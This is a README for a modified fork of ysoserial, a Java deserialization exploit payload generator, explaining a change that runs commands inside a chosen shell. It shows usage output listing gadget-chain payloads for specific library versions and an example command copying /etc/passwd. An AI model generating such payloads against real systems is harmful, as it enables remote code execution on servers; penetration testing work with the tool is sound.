
# ysoserial-modified 

Thats a fork of the original ysoserial application that can be found here: [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

## Description of the Modification

Due how `Runtime.getRuntime().exec(String.class)` works in java, nested and complex commands where you'll need control pipes or send the output to files (ex: cat /etc/passwd > /tmp/passwd_copy) will not work because the command isn't executed inside of a terminal environment. One possible hack is execute "/bin/sh -c 'command'" but you'll need escape spaces on the command to be executed using ${IFS} or it will not work as expected. For more details please read that [this blopost](http://codewhitesec.blogspot.com.au/2015/03/sh-or-getting-shell-environment-from.html) that will go deep on the details.

To fix that problem, arguments should be passed to the method `Runtime.getRuntime().exec(String[].class)` that expects an array of Strings.

So I added a functionality where you give the type of the terminal that you want use to create the command (cmd / bash / powershell / none) and my modification will execute your command inside of that terminal context allowing you to execute any complex command.

## Usage

```shell
pimps@Scorpion:~/git/ysoserial-modified/target$ java -jar ysoserial-modified.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'
   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'
	Available payload types:
		BeanShell1 [org.beanshell:bsh:2.0b5]
		C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
		CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
		CommonsCollections1 [commons-collections:commons-collections:3.1]
		CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections3 [commons-collections:commons-collections:3.1]
		CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections5 [commons-collections:commons-collections:3.1]
		CommonsCollections6 [commons-collections:commons-collections:3.1]
		FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
		Groovy1 [org.codehaus.groovy:groovy:2.3.9]
		Hibernate1 []
...
```
